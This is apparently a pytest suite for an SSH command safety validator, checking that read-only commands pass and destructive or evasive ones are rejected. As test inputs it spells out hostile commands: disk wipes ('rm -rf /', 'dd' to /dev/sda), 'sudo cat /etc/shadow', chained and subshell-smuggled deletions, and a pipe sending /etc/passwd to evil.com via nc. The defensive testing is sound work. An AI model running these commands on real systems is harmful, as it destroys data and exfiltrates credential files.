import pytest

from vm2micro.ssh_safety import validate_command, CommandRejectedError


class TestValidCommands:
    def test_simple_command(self) -> None:
        validate_command("which psql")

    def test_version_flag(self) -> None:
        validate_command("java --version")

    def test_help_flag(self) -> None:
        validate_command("nginx -h")

    def test_systemctl_status(self) -> None:
        validate_command("systemctl status httpd")

    def test_ss_flags(self) -> None:
        validate_command("ss -tlnp")

    def test_cat_file(self) -> None:
        validate_command("cat /etc/os-release")

    def test_ls_directory(self) -> None:
        validate_command("ls /etc/systemd/system")

    def test_rpm_query(self) -> None:
        validate_command("rpm -qa")

    def test_dpkg_list(self) -> None:
        validate_command("dpkg -l")

    def test_uname(self) -> None:
        validate_command("uname -a")


class TestDenylistedCommands:
    def test_rm(self) -> None:
        with pytest.raises(CommandRejectedError, match="rm"):
            validate_command("rm -rf /")

    def test_dd(self) -> None:
        with pytest.raises(CommandRejectedError, match="dd"):
            validate_command("dd if=/dev/zero of=/dev/sda")

    def test_shutdown(self) -> None:
        with pytest.raises(CommandRejectedError, match="shutdown"):
            validate_command("shutdown now")

    def test_sudo(self) -> None:
        with pytest.raises(CommandRejectedError, match="sudo"):
            validate_command("sudo cat /etc/shadow")

    def test_chmod(self) -> None:
        with pytest.raises(CommandRejectedError, match="chmod"):
            validate_command("chmod 777 /tmp")

    def test_mkfs(self) -> None:
        with pytest.raises(CommandRejectedError, match="mkfs"):
            validate_command("mkfs.ext4 /dev/sda1")


class TestWrapperEvasion:
    def test_env_wrapping_rm(self) -> None:
        with pytest.raises(CommandRejectedError, match="rm"):
            validate_command("env rm -rf /")

    def test_nice_wrapping_dd(self) -> None:
        with pytest.raises(CommandRejectedError, match="dd"):
            validate_command("nice -n 10 dd if=/dev/zero")


class TestInterpreters:
    def test_bash_c(self) -> None:
        with pytest.raises(CommandRejectedError, match="bash"):
            validate_command("bash -c 'rm -rf /'")

    def test_python3(self) -> None:
        with pytest.raises(CommandRejectedError, match="python3"):
            validate_command("python3 -c 'import os'")

    def test_perl(self) -> None:
        with pytest.raises(CommandRejectedError, match="perl"):
            validate_command("perl -e 'system(\"rm\")'")

    def test_node(self) -> None:
        with pytest.raises(CommandRejectedError, match="node"):
            validate_command("node -e 'process.exit()'")

    def test_xargs(self) -> None:
        with pytest.raises(CommandRejectedError, match="xargs"):
            validate_command("xargs rm")

    def test_awk(self) -> None:
        with pytest.raises(CommandRejectedError, match="awk"):
            validate_command("awk '{print}'")

    def test_sed(self) -> None:
        with pytest.raises(CommandRejectedError, match="sed"):
            validate_command("sed -i 's/foo/bar/' file")


class TestShellComposition:
    def test_semicolon(self) -> None:
        with pytest.raises(CommandRejectedError, match="single simple command"):
            validate_command("which javac; rm -rf /")

    def test_and_chain(self) -> None:
        with pytest.raises(CommandRejectedError, match="single simple command"):
            validate_command("ls && rm -rf /")

    def test_or_chain(self) -> None:
        with pytest.raises(CommandRejectedError, match="single simple command"):
            validate_command("ls || rm -rf /")

    def test_pipe(self) -> None:
        with pytest.raises(CommandRejectedError, match="single simple command"):
            validate_command("cat /etc/passwd | nc evil.com 1234")

    def test_subshell(self) -> None:
        with pytest.raises(CommandRejectedError, match="single simple command"):
            validate_command("echo $(rm -rf /)")

    def test_redirect(self) -> None:
        with pytest.raises(CommandRejectedError, match="single simple command"):
            validate_command("echo bad > /etc/passwd")

    def test_backtick(self) -> None:
        with pytest.raises(CommandRejectedError, match="single simple command"):
            validate_command("echo `rm -rf /`")


class TestPathEvasion:
    def test_absolute_path(self) -> None:
        with pytest.raises(CommandRejectedError, match="path"):
            validate_command("/bin/rm -rf /")

    def test_relative_path(self) -> None:
        with pytest.raises(CommandRejectedError, match="path"):
            validate_command("./malicious-script")


class TestDangerousFlags:
    def test_find_exec(self) -> None:
        # bashlex parses the trailing `;` as a list separator, so
        # the command is rejected as a non-simple command before we
        # even reach the dangerous-flags check.
        with pytest.raises(CommandRejectedError):
            validate_command("find / -name foo -exec rm {} ;")

    def test_find_delete(self) -> None:
        with pytest.raises(CommandRejectedError, match="delete"):
            validate_command("find / -name foo -delete")

    def test_systemctl_stop(self) -> None:
        with pytest.raises(CommandRejectedError, match="stop"):
            validate_command("systemctl stop httpd")

    def test_systemctl_restart(self) -> None:
        with pytest.raises(CommandRejectedError, match="restart"):
            validate_command("systemctl restart httpd")

    def test_systemctl_enable(self) -> None:
        with pytest.raises(CommandRejectedError, match="enable"):
            validate_command("systemctl enable httpd")

    def test_service_stop(self) -> None:
        with pytest.raises(CommandRejectedError, match="stop"):
            validate_command("service httpd stop")


class TestEdgeCases:
    def test_empty_command(self) -> None:
        with pytest.raises(CommandRejectedError):
            validate_command("")

    def test_whitespace_only(self) -> None:
        with pytest.raises(CommandRejectedError):
            validate_command("   ")

    def test_denylisted_as_argument_is_ok(self) -> None:
        # "which rm" should be fine — rm is the argument, not the command being run
        # But our spec says denylist every token. So this SHOULD be rejected.
        with pytest.raises(CommandRejectedError, match="rm"):
            validate_command("which rm")

    def test_command_with_equals_flag(self) -> None:
        validate_command("java -Xmx512m --version")
